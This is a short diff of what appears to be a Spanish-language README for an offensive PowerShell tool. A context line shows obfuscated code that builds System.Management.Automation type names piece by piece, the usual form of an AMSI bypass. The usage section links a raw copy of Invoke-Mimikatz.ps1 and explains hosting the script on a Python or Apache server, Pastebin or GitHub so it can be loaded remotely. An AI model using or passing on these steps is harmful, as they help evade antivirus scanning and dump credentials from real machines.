@@ -6,7 +6,7 @@ $a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automati
 
 # Ejemeplo de uso:
 
-Guardar en un un archivo Mimikatz del este repo:
+Guardar en un archivo, este script de Mimikatz del este repo:
 https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1
 
 Abres un servidor con Python o Apache y guardas el archivo con cualquier formato hasta en Webhost/Pastebin/Github etc, cualquier servidor con formato Raw
